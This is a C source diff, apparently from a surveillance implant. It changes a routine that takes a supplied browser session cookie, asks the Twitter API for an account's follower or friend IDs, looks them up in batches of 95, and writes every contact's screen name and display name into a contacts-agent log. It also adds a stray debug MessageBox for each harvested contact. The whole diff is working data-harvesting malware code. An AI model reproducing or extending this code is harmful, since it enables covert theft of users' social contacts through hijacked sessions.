@@ -18,17 +18,20 @@ extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
 
 #define TW_CONTACT_ID1 "\"screen_name\":\""
 #define TW_CONTACT_ID2 "\"name\":\""
-
+#define TW_ID_LIMIT 95
 DWORD ParseCategory(char *user, char *category, char *cookie)
 {
 	DWORD ret_val;
-	BYTE *r_buffer = NULL;
+	BYTE *r_buffer = NULL, *r_buffer_inner = NULL;
 	DWORD response_len;
-	char *parser1, *parser2;
-	WCHAR twitter_request[4096];
+	char *parser1, *parser2, *parser_inner1, *parser_inner2;
+	WCHAR twitter_request[256];
+	char post_data[2048];
 	char contact_name[256];
 	char screen_name[256];
+	char *id_ptr;
 	HANDLE hfile;
+	DWORD id_count;
 	WCHAR *screen_name_w, *contact_name_w;
 
 	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/%S/ids.json?cursor=-1&user_id=%S", category, user);
@@ -47,50 +50,76 @@ DWORD ParseCategory(char *user, char *category, char *cookie)
 		SAFE_FREE(r_buffer);
 		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
-	*parser2=0;
+	*parser2=0;	
 
-	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/users/lookup.json?user_id=%S&screen_name=", parser1);
-	SAFE_FREE(r_buffer);
-
-	ret_val = HttpSocialRequest(L"api.twitter.com", L"GET", twitter_request, 443, NULL, 0, &r_buffer, &response_len, cookie);	
-	if (ret_val != SOCIAL_REQUEST_SUCCESS)
-		return ret_val;
-
-	parser1 = (char *)r_buffer;
-	
-	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
-	for (;;) {
-		parser1 = strstr(parser1, TW_CONTACT_ID1);
-		if (!parser1)
+	id_ptr = parser1;
+	LOOP {
+		if (!id_ptr || *id_ptr==0) 
 			break;
-		parser1 += strlen(TW_CONTACT_ID1);
-		parser2 = strchr(parser1, '\"');
-		if (!parser2)
-			break;
-		*parser2 = NULL;
-		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser1);
-		parser1 = parser2 + 1;
 
-		parser1 = strstr(parser1, TW_CONTACT_ID2);
-		if (!parser1)
-			break;
-		parser1 += strlen(TW_CONTACT_ID2);
-		parser2 = strchr(parser1, '\"');
-		if (!parser2)
-			break;
-		*parser2 = NULL;
-		_snprintf_s(contact_name, sizeof(contact_name), _TRUNCATE, "%s", parser1);
-		parser1 = parser2 + 1;
-
-		contact_name_w = UTF8_2_UTF16(contact_name);
-		screen_name_w = UTF8_2_UTF16(screen_name);
-
-		DumpContact(hfile, screen_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, contact_name_w);
+		id_count = 1;
+		LOOP {
+			id_ptr = strstr((char *)id_ptr, ",");
+			if (!id_ptr)
+				break;
+			if (id_count == TW_ID_LIMIT) {
+				*id_ptr=0;
+				id_ptr++;
+				break;
+			}
+			id_count++;
+			id_ptr++;
+		}			
 		
-		SAFE_FREE(contact_name_w);
-		SAFE_FREE(screen_name_w);
+		_snprintf_s(post_data, sizeof(post_data), _TRUNCATE, "user_id=%s", parser1);
+		parser1 = id_ptr;
+		
+		CheckProcessStatus();
+
+		ret_val = HttpSocialRequest(L"api.twitter.com", L"POST", L"/1/users/lookup.json", 443, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &response_len, cookie);	
+		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
+			SAFE_FREE(r_buffer);
+			return ret_val;
+		}
+	
+		parser_inner1 = (char *)r_buffer_inner;
+	
+		hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+		LOOP {
+			parser_inner1 = strstr(parser_inner1, TW_CONTACT_ID1);
+			if (!parser_inner1)
+				break;
+			parser_inner1 += strlen(TW_CONTACT_ID1);
+			parser_inner2 = strchr(parser_inner1, '\"');
+			if (!parser_inner2)
+				break;
+			*parser_inner2 = NULL;
+			_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser_inner1);
+			parser_inner1 = parser_inner2 + 1;
+
+			parser_inner1 = strstr(parser_inner1, TW_CONTACT_ID2);
+			if (!parser_inner1)
+				break;
+			parser_inner1 += strlen(TW_CONTACT_ID2);
+			parser_inner2 = strchr(parser_inner1, '\"');
+			if (!parser_inner2)
+				break;
+			*parser_inner2 = NULL;
+			_snprintf_s(contact_name, sizeof(contact_name), _TRUNCATE, "%s", parser_inner1);
+			parser_inner1 = parser_inner2 + 1;
+
+			MessageBox(NULL, contact_name, screen_name, MB_OK);
+			contact_name_w = UTF8_2_UTF16(contact_name);
+			screen_name_w = UTF8_2_UTF16(screen_name);
+
+			DumpContact(hfile, screen_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, contact_name_w);
+		
+			SAFE_FREE(contact_name_w);
+			SAFE_FREE(screen_name_w);
+		}
+		Log_CloseFile(hfile);
+		SAFE_FREE(r_buffer_inner);
 	}
-	Log_CloseFile(hfile);
 
 	SAFE_FREE(r_buffer);
 	return SOCIAL_REQUEST_SUCCESS;
